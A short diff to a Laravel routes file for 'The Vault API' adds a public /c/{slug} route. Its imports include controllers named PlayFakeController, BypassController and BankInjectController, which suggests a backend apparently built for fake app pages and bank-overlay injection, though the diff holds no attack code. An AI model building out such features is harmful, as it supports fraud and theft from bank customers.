@@ -5,9 +5,11 @@ use App\Http\Controllers\PlayFakeController;
 use App\Http\Controllers\QrCodeController;
 use App\Http\Controllers\BypassController;
 use App\Http\Controllers\BankInjectController;
+use App\Http\Controllers\PublicAppController;
 
 Route::get('/health', function () { return response()->json(['status' => 'online', 'service' => 'The Vault API', 'timestamp' => now()]); });
 Route::post('/auth/login', [AuthController::class, 'login']);
+Route::get('/c/{slug}', [PublicAppController::class, 'show']);
 
 Route::middleware('auth:sanctum')->group(function () {
     Route::get('/auth/me', [AuthController::class, 'me']);
